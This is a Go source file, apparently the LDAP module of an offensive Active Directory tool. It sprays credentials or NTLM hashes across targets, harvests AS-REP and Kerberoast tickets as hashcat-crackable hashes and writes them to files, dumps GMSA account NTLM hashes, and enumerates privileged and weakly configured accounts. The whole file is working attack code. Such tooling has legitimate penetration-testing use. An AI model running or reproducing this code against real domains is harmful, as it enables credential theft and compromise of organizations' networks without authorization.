package optldap

import (
	"fmt"
	"strings"
	"sync"

	"github.com/5amu/goad/internal/printer"
	"github.com/5amu/goad/internal/utils"
	"github.com/5amu/goad/pkg/kerberos"
	"github.com/5amu/goad/pkg/ldap"
	"github.com/5amu/goad/pkg/smb"
)

type Options struct {
	Targets struct {
		TARGETS []string `description:"Provide target IP/FQDN/FILE"`
	} `positional-args:"yes"`

	CustomQuery struct {
		SearchFilter string `short:"f" long:"filter" description:"Bring your own filter"`
		Attributes   string `short:"a" long:"attributes" description:"Ask your attributes (comma separated)"`
	}

	Connection struct {
		Username string `short:"u" description:"Provide username (or FILE)"`
		Password string `short:"p" description:"Provide password (or FILE)"`
		NTLM     string `short:"H" long:"hashes" description:"Authenticate with NTLM hash"`
		Domain   string `short:"d" long:"domain" description:"Provide domain"`
		Port     int    `long:"port" default:"389" description:"Ldap port to contact"`
		SSL      bool   `short:"s" long:"ssl" description:"Use ssl to interact with ldap"`
		SkipTLS  bool   `long:"skiptls" description:"Upgrade the ldap connection"`
	} `group:"Connection Options" description:"Connection Options"`

	Hashes struct {
		AsrepRoast string `long:"asreproast" description:"Grab AS_REP ticket(s) parsed to be cracked with hashcat"`
		Kerberoast string `long:"kerberoast" description:"Grab TGS ticket(s) parsed to be cracked with hashcat"`
	} `group:"Hash Retrieval Options" description:"Hash Retrieval Options"`

	Enum struct {
		TrustedForDelegation bool   `long:"trusted-for-delegation" description:"Get the list of users and computers with flag TRUSTED_FOR_DELEGATION"`
		PasswordNotRequired  bool   `long:"password-not-required" description:"Get the list of users with flag PASSWD_NOTREQD"`
		PasswordNeverExpires bool   `long:"password-never-expires" description:"Get the list of accounts with flag DONT_EXPIRE_PASSWD"`
		AdminCount           bool   `long:"admin-count" description:"Get objets that had the value adminCount=1"`
		Users                bool   `long:"users" description:"Enumerate enabled domain users"`
		User                 string `long:"user" description:"Find data about a single user"`
		Computers            bool   `long:"computers" description:"Enumerate computers in the domain"`
		ActiveUsers          bool   `long:"active-users" description:"Enumerate active enabled domain users"`
		Groups               bool   `long:"groups" description:"Enumerate domain groups"`
		DCList               bool   `long:"dc-list" description:"Enumerate Domain Controllers"`
		GetSID               bool   `long:"get-sid" description:"Get domain sid"`
		GMSA                 bool   `long:"gmsa" description:"Enumerate GMSA passwords"`
	} `group:"Enumeration Options" description:"Enumeration Options"`

	/*
		BH struct {
			Bloodhound           string   `long:"bloodhound" description:"Run bloodhound collector (v4.2) and save in output file (zip)"`
			BloodhoundNameserver string   `short:"n" long:"nameserver" description:"Provide a nameserver for bloodhound collector"`
			Collection           []string `short:"c" long:"collection" default:"Default" description:"Which information to collect. Supported: Group, LocalAdmin, Session, Trusts, Default, DCOnly, DCOM, RDP, PSRemote, LoggedOn, Container, ObjectProps, ACL, All"`
		} `group:"Run Bloodhound Collector v4.2" description:"Run Bloodhound Collector v4.2"`
	*/

	target2SMBInfo map[string]*smb.SMBInfo
	filter         string
	attributes     []string
	printMutex     sync.Mutex
	credentials    []utils.Credential
}

func (o *Options) getFunction() func(string) {
	if o.CustomQuery.SearchFilter != "" && o.CustomQuery.Attributes != "" {
		o.filter = o.CustomQuery.SearchFilter
		o.attributes = strings.Split(o.CustomQuery.Attributes, ",")
		return o.enumeration
	}
	if o.Hashes.AsrepRoast != "" {
		return o.asreproast
	}
	if o.Hashes.Kerberoast != "" {
		return o.kerberoast
	}
	if o.Enum.GetSID {
		return o.domainSID
	}
	if o.Enum.TrustedForDelegation {
		o.filter = ldap.JoinFilters(
			ldap.FilterIsUser,
			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
			ldap.UACFilter(ldap.TRUSTED_FOR_DELEGATION),
		)
		return o.enumeration
	}
	if o.Enum.PasswordNotRequired {
		o.filter = ldap.JoinFilters(
			ldap.FilterIsUser,
			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
			ldap.UACFilter(ldap.PASSWD_NOTREQD),
		)
		return o.enumeration
	}
	if o.Enum.Users {
		o.filter = ldap.FilterIsUser
		return o.enumeration
	}
	if o.Enum.Computers {
		o.filter = ldap.FilterIsComputer
		return o.enumeration
	}
	if o.Enum.User != "" {
		o.filter = ldap.JoinFilters(
			ldap.FilterIsUser,
			ldap.NewFilter(ldap.SAMAccountName, o.Enum.User),
		)
		return o.enumeration
	}
	if o.Enum.ActiveUsers {
		o.filter = ldap.JoinFilters(
			ldap.FilterIsUser,
			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
		)
		return o.enumeration
	}
	if o.Enum.Groups {
		o.filter = ldap.FilterIsGroup
		return o.enumeration
	}
	if o.Enum.DCList {
		o.filter = ldap.JoinFilters(
			ldap.FilterIsComputer,
			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
			ldap.UACFilter(ldap.SERVER_TRUST_ACCOUNT),
		)
		return o.enumeration
	}
	if o.Enum.PasswordNeverExpires {
		o.filter = ldap.JoinFilters(
			ldap.FilterIsUser,
			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
			ldap.UACFilter(ldap.DONT_EXPIRE_PASSWORD),
		)
		return o.enumeration
	}
	if o.Enum.AdminCount {
		o.filter = ldap.JoinFilters(
			ldap.FilterIsUser,
			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
			ldap.FilterIsAdmin,
		)
		return o.enumeration
	}
	if o.Enum.GMSA {
		return o.gmsa
	}
	return func(s string) {
		_, _, _ = o.authenticate(s)
	}
}

func (o *Options) Run() (err error) {
	o.target2SMBInfo = utils.GatherSMBInfoToMap(
		utils.ExtractTargets(o.Targets.TARGETS),
		o.Connection.Port,
	)

	var f func(string) = o.getFunction()

	o.credentials = utils.NewCredentialsDispacher(
		o.Connection.Username,
		o.Connection.Password,
		o.Connection.NTLM,
		utils.Clusterbomb,
	)

	var wg sync.WaitGroup
	for target := range o.target2SMBInfo {
		wg.Add(1)
		go func(t string) {
			if ldap.IsLDAP(t, o.Connection.Port) {
				f(t)
			}
			wg.Done()
		}(target)
	}
	wg.Wait()
	return nil
}

func (o *Options) authenticate(target string) (*ldap.LdapClient, utils.Credential, error) {
	ldapClient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, o.Connection.SkipTLS)

	prt := printer.NewPrinter("LDAP", ldapClient.Host, o.target2SMBInfo[ldapClient.Host].NetBIOSName, ldapClient.Port)
	defer prt.PrintStored(&o.printMutex)

	for _, creds := range o.credentials {
		if creds.Hash != "" {
			if err := ldapClient.AuthenticateNTLM(creds.Username, creds.Hash); err != nil {
				prt.StoreFailure(creds.StringWithDomain(o.Connection.Domain))
			} else {
				prt.StoreSuccess(creds.StringWithDomain(o.Connection.Domain))
				return ldapClient, creds, nil
			}
		} else {
			if err := ldapClient.Authenticate(creds.Username, creds.Password); err != nil {
				prt.StoreFailure(creds.StringWithDomain(o.Connection.Domain))
			} else {
				prt.StoreSuccess(creds.StringWithDomain(o.Connection.Domain))
				return ldapClient, creds, nil
			}
		}
	}
	return nil, utils.Credential{}, fmt.Errorf("no valid authentication")
}

func (o *Options) asreproast(target string) {
	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSName, o.Connection.Port)
	defer prt.PrintStored(&o.printMutex)

	lclient, creds, err := o.authenticate(target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}
	defer lclient.Close()

	ldapFilter := ldap.JoinFilters(
		ldap.FilterIsUser,
		ldap.UACFilter(ldap.DONT_REQ_PREAUTH),
	)

	krb5client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}

	krb5client.AuthenticateWithPassword(creds.Username, creds.Password)

	var hashes []string
	err = lclient.FindADObjectsWithCallback(ldapFilter, func(obj ldap.ADObject) error {
		asrep, err := krb5client.GetAsReqTgt(obj.SAMAccountName)
		if err != nil {
			return err
		}
		hash := kerberos.ASREPToHashcat(*asrep.Ticket)
		prt.Store(obj.SAMAccountName, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))
		hashes = append(hashes, hash)
		return nil
	})
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}

	prt.Store("Saving hashes to", o.Hashes.AsrepRoast)
	err = utils.WriteLines(hashes, o.Hashes.AsrepRoast)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}
}

func (o *Options) kerberoast(target string) {
	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSName, o.Connection.Port)
	defer prt.PrintStored(&o.printMutex)

	lclient, creds, err := o.authenticate(target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}
	defer lclient.Close()

	ldapFilter := ldap.JoinFilters(
		ldap.FilterIsUser,
		ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
	)

	krb5client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}

	krb5client.AuthenticateWithPassword(creds.Username, creds.Password)

	var hashes []string
	err = lclient.FindADObjectsWithCallback(ldapFilter, func(obj ldap.ADObject) error {
		if len(obj.ServicePrincipalName) == 0 {
			return nil
		}

		for i, spn := range obj.ServicePrincipalName {
			tgs, err := krb5client.GetServiceTicket(obj.SAMAccountName, spn)
			if err != nil {
				return err
			}

			hash := kerberos.TGSToHashcat(tgs.Ticket, obj.SAMAccountName)
			prt.Store(obj.SAMAccountName, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))

			if i == 0 {
				hashes = append(hashes, hash)
			}
		}
		return nil
	})
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}

	if len(hashes) == 0 {
		return
	}
	prt.Store("Saving hashes to", o.Hashes.Kerberoast)
	err = utils.WriteLines(hashes, o.Hashes.Kerberoast)
	if err != nil {
		prt.StoreFailure(err.Error())
	}
}

func (o *Options) enumeration(target string) {
	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSName, o.Connection.Port)
	defer prt.PrintStored(&o.printMutex)

	lclient, _, err := o.authenticate(target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}
	defer lclient.Close()

	err = lclient.FindADObjectsWithCallback(o.filter, func(obj ldap.ADObject) error {
		if o.CustomQuery.Attributes == "" {
			prt.Store(obj.SAMAccountName, obj.Description)
		} else {
			var toStore []string
			attrs := strings.Split(o.CustomQuery.Attributes, ",")
			for _, attr := range attrs {
				switch strings.ToLower(attr) {
				case strings.ToLower(ldap.DistinguishedName):
					toStore = append(toStore, obj.DistinguishedName)
				case strings.ToLower(ldap.SAMAccountName):
					toStore = append(toStore, obj.SAMAccountName)
				case strings.ToLower(ldap.PasswordLastSet):
					toStore = append(toStore, obj.PWDLastSet)
				case strings.ToLower(ldap.LastLogon):
					toStore = append(toStore, obj.LastLogon)
				case strings.ToLower(ldap.Description):
					toStore = append(toStore, obj.Description)
				case strings.ToLower(ldap.MemberOf):
					toStore = append(toStore, fmt.Sprint(obj.MemberOf))
				case strings.ToLower(ldap.ServicePrincipalName):
					toStore = append(toStore, fmt.Sprint(obj.ServicePrincipalName))
				}
			}
			prt.Store(toStore...)
		}
		return err
	})
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}
}

func (o *Options) domainSID(target string) {
	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSName, o.Connection.Port)
	defer prt.PrintStored(&o.printMutex)

	lclient, _, err := o.authenticate(target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}
	defer lclient.Close()

	sid, err := lclient.GetDomainSID()
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}

	prt.Store(sid)
}

func (o *Options) gmsa(target string) {
	prt := printer.NewPrinter("LDAP", target, o.target2SMBInfo[target].NetBIOSName, o.Connection.Port)
	defer prt.PrintStored(&o.printMutex)

	lclient, _, err := o.authenticate(target)
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}
	defer lclient.Close()

	gmsa, err := lclient.GetGMSA()
	if err != nil {
		prt.StoreFailure(err.Error())
		return
	}

	if len(gmsa) > 0 {
		prt.StoreInfo(fmt.Sprintf("Found GMSA Passwords: %d", len(gmsa)))
	}

	for _, g := range gmsa {
		prt.Store(fmt.Sprintf("Account: %s", g.SAMAccountName), fmt.Sprintf("NTLM: %s", g.NTLM))
	}
}
